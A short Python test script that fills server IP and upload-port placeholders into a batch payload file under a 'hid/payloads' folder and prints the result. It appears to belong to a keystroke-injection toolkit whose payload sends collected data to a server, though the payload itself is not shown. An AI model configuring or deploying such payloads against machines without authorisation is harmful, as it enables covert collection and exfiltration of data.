import sys
import os

def test_sub():
    payload_path = os.path.join('hid', 'payloads', 'full_audit.bat')
    with open(payload_path, 'r') as f:
        content = f.read()

    server_ip = '192.168.1.100'
    upload_port = 8080

    content = content.replace('{{SERVER_IP}}', str(server_ip))
    content = content.replace('{{UPLOAD_PORT}}', str(upload_port))
    
    print("SUCCESS" if "192.168.1.100" in content and "8080" in content else "FAILED")
    print(content)

test_sub()
